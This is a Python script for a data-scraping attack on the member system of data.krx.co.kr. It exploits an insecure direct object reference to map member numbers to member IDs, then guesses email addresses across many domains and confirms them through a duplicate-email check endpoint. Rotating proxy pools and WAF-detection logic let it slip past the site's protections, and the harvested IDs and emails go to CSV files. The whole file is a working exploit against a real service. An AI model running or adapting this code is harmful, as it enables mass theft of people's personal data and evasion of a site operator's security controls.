#!/usr/bin/env python3
"""data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail.

Never treat WAF/HTML/redirect as empty. Keep working proxies. Retry until
real JSON. Re-check ids that have no email yet with extra domains.
"""
from __future__ import annotations

import csv
import json
import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any
from urllib.parse import urlparse, urlunparse

import requests

BASE = "https://data.krx.co.kr"
IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
# High-hit first, then extra Korean/global domains for leftover ids.
DOMS_PRIMARY = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
DOMS_EXTRA = [
    "nate.com",
    "outlook.com",
    "hotmail.com",
    "yahoo.com",
    "yahoo.co.kr",
    "icloud.com",
    "me.com",
    "googlemail.com",
    "outlook.kr",
    "hanmail.com",
    "korea.com",
    "dreamwiz.com",
    "proton.me",
    "krx.or.kr",
]
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
START = int(os.environ.get("KRX_START", "2000005000"))
END = int(os.environ.get("KRX_END", "2000222667"))
WORKERS = int(os.environ.get("KRX_WORKERS", "12"))
OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
CLOUD_GOOD_FROM = 2000005966  # before this, cloud dump had not really started

_tls = threading.local()
_lock = threading.Lock()
_stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}


def panda_urls() -> list[str]:
    urls: list[str] = []
    u = os.environ.get("KRX_PANDA_URL", "").strip()
    if u:
        urls.append(u)
    for i in range(2, 9):
        u = os.environ.get(f"KRX_PANDA_URL_{i}", "").strip()
        if u:
            urls.append(u)
    for part in os.environ.get("KRX_PANDA_URLS", "").split("|"):
        part = part.strip()
        if part:
            urls.append(part)
    return urls


def inject_auth(proxy: str) -> str:
    if not PROXY_AUTH or "@" in proxy.split("://", 1)[-1]:
        return proxy
    p = urlparse(proxy)
    host = p.netloc
    return urlunparse((p.scheme or "http", f"{PROXY_AUTH}@{host}", p.path, "", p.query, ""))


class ProxyPool:
    def __init__(self) -> None:
        self.urls = panda_urls()
        self.proxies: list[str] = []
        self.good: list[str] = []
        self.bad: set[str] = set()
        self.strikes: dict[str, int] = {}
        self.last_fetch = 0.0
        self.ui = 0
        self.i = 0
        if STATIC_PROXY and not self.urls:
            self.proxies = [STATIC_PROXY]

    def _normalize(self, line: str) -> str | None:
        line = line.strip()
        if not line or line.startswith("{"):
            return None
        if "://" not in line:
            line = "http://" + line
        return inject_auth(line)

    def fetch(self) -> None:
        if not self.urls:
            return
        now = time.time()
        wait = 1.3 - (now - self.last_fetch)
        if wait > 0:
            time.sleep(wait)
        url = self.urls[self.ui % len(self.urls)]
        self.ui += 1
        try:
            r = requests.get(url, timeout=15)
            self.last_fetch = time.time()
            got = [x for x in (self._normalize(t) for t in r.text.splitlines()) if x]
        except Exception:
            self.last_fetch = time.time()
            got = []
        if not got:
            return
        with _lock:
            for p in got:
                if p not in self.proxies:
                    self.proxies.append(p)
                self.bad.discard(p)
                self.strikes.pop(p, None)
            if len(self.proxies) > 24:
                keep = set(self.good) | set(got)
                self.proxies = [p for p in self.proxies if p in keep][-24:]
        print(f"proxy_pool +{len(got)} live={self.live_n()} good={len(self.good)}", flush=True)

    def live_n(self) -> int:
        return len([p for p in self.proxies if p not in self.bad])

    def pick(self) -> str | None:
        with _lock:
            prefer = [p for p in self.good if p not in self.bad]
            live = prefer or [p for p in self.proxies if p not in self.bad]
        if not live:
            self.fetch()
            with _lock:
                live = [p for p in self.good + self.proxies if p not in self.bad]
                if not live:
                    live = list(self.proxies) or ([STATIC_PROXY] if STATIC_PROXY else [])
        if not live:
            return STATIC_PROXY or None
        with _lock:
            self.i += 1
            return live[self.i % len(live)]

    def ok(self, proxy: str | None) -> None:
        if not proxy:
            return
        with _lock:
            self.strikes.pop(proxy, None)
            self.bad.discard(proxy)
            if proxy not in self.good:
                self.good.append(proxy)

    def fail(self, proxy: str | None) -> None:
        if not proxy:
            return
        with _lock:
            _stats["retry"] += 1
            n = self.strikes.get(proxy, 0) + 1
            self.strikes[proxy] = n
            if n >= 2:
                self.bad.add(proxy)
                if proxy in self.good:
                    self.good.remove(proxy)
            live = len([p for p in self.proxies if p not in self.bad])
        if live < 3:
            self.fetch()


POOL = ProxyPool()


def is_waf(resp: requests.Response) -> bool:
    if resp.status_code != 200:
        return True
    head = resp.text[:800]
    if head.lstrip().startswith("<"):
        return True
    return any(
        s in head
        for s in (
            "에러페이지",
            "Access Denied",
            "document has been moved",
            "ERROR: The request could not be satisfied",
        )
    )


def json_body(resp: requests.Response) -> dict[str, Any] | None:
    if is_waf(resp):
        return None
    try:
        data = resp.json()
    except Exception:
        return None
    return data if isinstance(data, dict) else None


def session_for(proxy: str | None) -> requests.Session:
    cache: dict[str, requests.Session] = getattr(_tls, "cache", None) or {}
    _tls.cache = cache
    key = proxy or "direct"
    s = cache.get(key)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
        s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0))
        if proxy:
            s.proxies.update({"http": proxy, "https": proxy})
        try:
            s.get(BASE + "/contents/MDC/MAIN/main/index.cmd", timeout=12)
        except Exception:
            pass
        cache[key] = s
        if len(cache) > 10:
            cache.pop(next(iter(cache)))
    return s


def drop_session(proxy: str | None) -> None:
    cache = getattr(_tls, "cache", None)
    if not cache:
        return
    cache.pop(proxy or "direct", None)


def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
    fails = 0
    while True:
        proxy = POOL.pick()
        s = session_for(proxy)
        try:
            r = s.post(
                url,
                data=data,
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=15,
            )
            body = json_body(r)
            if body is not None and need in body:
                POOL.ok(proxy)
                return body
        except Exception:
            pass
        drop_session(proxy)
        POOL.fail(proxy)
        fails += 1
        if fails % 4 == 0:
            time.sleep(min(0.25 * (fails // 4), 2.5) + random.random() * 0.2)


def mbr_id(mno: int) -> str | None:
    body = post_ok(
        IDOR,
        {"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
        "block1",
    )
    block = body.get("block1") or []
    if not block:
        return None
    return block[0].get("MBR_ID")


def dup_email(mid: str, domains: list[str]) -> str | None:
    for d in domains:
        em = f"{mid}@{d}"
        body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
        val = body.get("isDupMbrEmail")
        if val is True or str(val).lower() == "true":
            return em
    return None


def one_idor(mno: int) -> tuple[int, str | None, str | None]:
    while True:
        try:
            mid = mbr_id(mno)
            if not mid:
                return mno, None, None
            return mno, mid, dup_email(mid, DOMS_PRIMARY + DOMS_EXTRA)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def one_mail(mno: int, mid: str) -> tuple[int, str | None, str | None]:
    while True:
        try:
            return mno, mid, dup_email(mid, DOMS_EXTRA)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def load_csv_map(path: str) -> dict[int, str]:
    out: dict[int, str] = {}
    if not os.path.exists(path):
        return out
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo", "mno"}:
                continue
            try:
                out[int(row[0])] = row[1] if len(row) > 1 else ""
            except ValueError:
                continue
    return out


def load_empty(path: str) -> set[int]:
    seen: set[int] = set()
    if not os.path.exists(path):
        return seen
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo"}:
                continue
            if len(row) > 1 and row[1] == "empty":
                try:
                    seen.add(int(row[0]))
                except ValueError:
                    continue
    return seen


def main() -> None:
    os.makedirs(OUTDIR, exist_ok=True)
    state_path = os.path.join(OUTDIR, "state.json")
    scanned_path = os.path.join(OUTDIR, "scanned.csv")
    email_path = os.path.join(OUTDIR, "emails.csv")
    id_path = os.path.join(OUTDIR, "ids.csv")

    have_id = load_csv_map(id_path)
    have_email = load_csv_map(email_path)
    confirmed_empty = load_empty(scanned_path)

    email_new = not os.path.exists(email_path)
    id_new = not os.path.exists(id_path)
    scan_new = not os.path.exists(scanned_path)
    ef = open(email_path, "a", newline="", encoding="utf-8")
    idf = open(id_path, "a", newline="", encoding="utf-8")
    sf = open(scanned_path, "a", newline="", encoding="utf-8")
    ew, iw, sw = csv.writer(ef), csv.writer(idf), csv.writer(sf)
    if email_new:
        ew.writerow(["mbrNo", "mbrId", "email"])
    if id_new:
        iw.writerow(["mbrNo", "mbrId"])
    if scan_new:
        sw.writerow(["mbrNo", "status", "mbrId"])

    if POOL.urls:
        POOL.fetch()

    # Mail leftovers first (id exists, no email yet) — extra domains only.
    mail_jobs = [(n, mid) for n, mid in have_id.items() if n not in have_email and mid]
    # IDOR order: never-scanned head, then tail after last real id, then holes.
    idor_jobs: list[int] = []
    seen_skip = set(have_id) | confirmed_empty
    last_id = max(have_id) if have_id else START
    head = [n for n in range(START, min(END, CLOUD_GOOD_FROM - 1) + 1) if n not in seen_skip]
    tail_from = max(START, last_id + 1)
    tail = [n for n in range(tail_from, END + 1) if n not in seen_skip]
    holes = [
        n
        for n in range(max(START, CLOUD_GOOD_FROM), min(END, last_id) + 1)
        if n not in seen_skip
    ]
    idor_jobs = head + tail + holes

    total = len(mail_jobs) + len(idor_jobs)
    print(
        f"workers={WORKERS} mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
        f"head={len(head)} tail={len(tail)} holes={len(holes)} "
        f"have_id={len(have_id)} have_email={len(have_email)} panda={len(POOL.urls)}",
        flush=True,
    )
    last_flush = time.time()
    wrote_id = set(have_id)
    wrote_em = set(have_email)

    def handle(mno: int, mid: str | None, em: str | None, kind: str) -> None:
        nonlocal last_flush
        with _lock:
            _stats["done"] += 1
            if kind == "idor":
                sw.writerow([mno, "id" if mid else "empty", mid or ""])
                if mid and mno not in wrote_id:
                    _stats["ids"] += 1
                    wrote_id.add(mno)
                    iw.writerow([mno, mid])
            if em and mno not in wrote_em:
                _stats["emails"] += 1
                wrote_em.add(mno)
                ew.writerow([mno, mid, em])
            done = _stats["done"]
            if time.time() - last_flush > 5:
                ef.flush()
                idf.flush()
                sf.flush()
                elapsed = max(time.time() - _stats["t0"], 0.001)
                rate = done / elapsed
                remain = max(total - done, 0)
                eta = remain / rate if rate else 0
                json.dump(
                    {
                        "done": done,
                        "total": total,
                        "ids": _stats["ids"],
                        "emails": _stats["emails"],
                        "err": _stats["err"],
                        "retry": _stats["retry"],
                        "good_proxies": len(POOL.good),
                        "rate_per_s": round(rate, 2),
                        "eta_min": round(eta / 60, 1),
                        "last": mno,
                    },
                    open(state_path, "w"),
                )
                print(
                    f"done={done}/{total} ids+={_stats['ids']} emails+={_stats['emails']} "
                    f"retry={_stats['retry']} good={len(POOL.good)} "
                    f"{rate:.1f}/s eta={eta/60:.1f}min last={mno}",
                    flush=True,
                )
                last_flush = time.time()

    def run_batch(futs, kind: str) -> None:
        for fut in as_completed(futs):
            mno, mid, em = fut.result()
            handle(mno, mid, em, kind)
    chunk = 300
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        i = 0
        while i < len(mail_jobs):
            batch = mail_jobs[i : i + chunk]
            run_batch([ex.submit(one_mail, n, mid) for n, mid in batch], "mail")
            i += chunk
        i = 0
        while i < len(idor_jobs):
            batch = idor_jobs[i : i + chunk]
            run_batch([ex.submit(one_idor, n) for n in batch], "idor")
            i += chunk

    ef.flush()
    idf.flush()
    sf.flush()
    ef.close()
    idf.close()
    sf.close()
    print("FINISHED", _stats, flush=True)


if __name__ == "__main__":
    main()
